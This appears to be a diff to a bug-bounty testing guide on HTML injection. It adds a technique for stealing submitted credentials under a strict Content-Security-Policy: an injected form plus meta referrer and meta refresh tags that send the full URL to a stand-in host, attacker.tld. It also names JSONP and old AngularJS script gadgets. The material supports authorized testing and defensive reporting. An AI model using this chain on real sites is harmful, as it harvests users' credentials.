@@ -2,7 +2,7 @@
 name: hunt-html-injection
 description: "Hunt HTML Injection — user-supplied input is rendered as raw HTML in the response without sanitisation, allowing an attacker to inject arbitrary HTML tags (but not necessarily JavaScript). Lower severity than XSS but enables phishing, UI manipulation, and credential harvesting via injected forms. Use when testing text-display surfaces (search results, profile fields, comments, error messages, feedback forms). For markup that executes JavaScript, escalate to hunt-xss."
 sources: hackerone_public, public_research
-report_count: 6
+report_count: 7
 ---
 
 ## What is HTML Injection
@@ -60,3 +60,17 @@ Confirmed when your injected tag appears in the response body with literal `<` a
 - XSS: `<script>alert(1)</script>` executes JavaScript.
 
 Some WAFs block `<script>` but pass `<b>` or `<img>` — start with non-script tags, then escalate.
+
+## Credential Theft Through HTML Injection Even Under a Strict CSP (`form-action` + meta-refresh gadget)
+
+Don't stop testing just because the target has a strict `Content-Security-Policy` that blocks every script source — HTML injection alone (no JS execution at all) can still steal submitted credentials, because `form-action` and `<meta>` navigation are two primitives CSP's `script-src`/`default-src` do **not** cover unless explicitly set.
+
+- **Precondition:** an unescaped HTML injection point (same as above), and a CSP that either has no `form-action` directive (it does **not** inherit from `default-src`) or sets `form-action 'self'`.
+- **Stage 1 — inject a credential-harvesting form with no `action`.** A form with no `action` attribute submits back to the *same* page via GET, which `form-action 'self'` (or an unset `form-action`) permits even when `script-src`/`default-src` is locked to `'none'`. Add a same-named `<textarea>` holding your stage-2 payload so it rides along as a query param when the victim submits their username/password.
+- **Stage 2 — reflect the payload as live markup.** If the same injection point reflects the submitted query string back into the page, your stage-2 payload (now containing the credentials) renders. Use `<meta name=referrer content=unsafe-url>` to force the browser to send the **full URL** — including the credentials now sitting in the query string — in the `Referer` header, then `<meta http-equiv=refresh content="0;url=https://attacker.tld">` to navigate there. No `<script>` tag, no event handler, no CSP violation: the attacker's server simply reads the credentials out of the incoming `Referer` header.
+- **Why CSP doesn't stop this:** no JavaScript executes at any point — `form-action` governs only where forms submit (and is commonly left unset or scoped `'self'` since it's considered "low risk"), and `<meta>`-driven navigation/referrer-policy is not a script-src-governed primitive.
+- **When a script-src gadget is available instead:** if the CSP's allow-listed script hosts include a JSONP endpoint or an outdated library (old AngularJS builds are a classic host-based CSP bypass gadget), you can skip the form-action route and inject a `<script src>` pointing at that allow-listed host to execute JS directly under the policy.
+- **Report framing:** a "CSP is correctly configured, blocks XSS" finding is incomplete if you haven't tried a form-action-only chain — note explicitly in the write-up that CSP presence does not equal credential-theft immunity, and recommend the target set `form-action 'none'` (or a tight allow-list) rather than relying on `default-src` to cover it.
+- Source: https://portswigger.net/research/blind-trust-stealing-credentials-through-csp (PortSwigger Research, Nov 2026).
+
+See `hunt-xss` → **Bypass Techniques → CSP Bypass** for the script-src gadget-hunting side of this (JSONP endpoints, vulnerable allow-listed libraries, `<base>`-tag redirection).
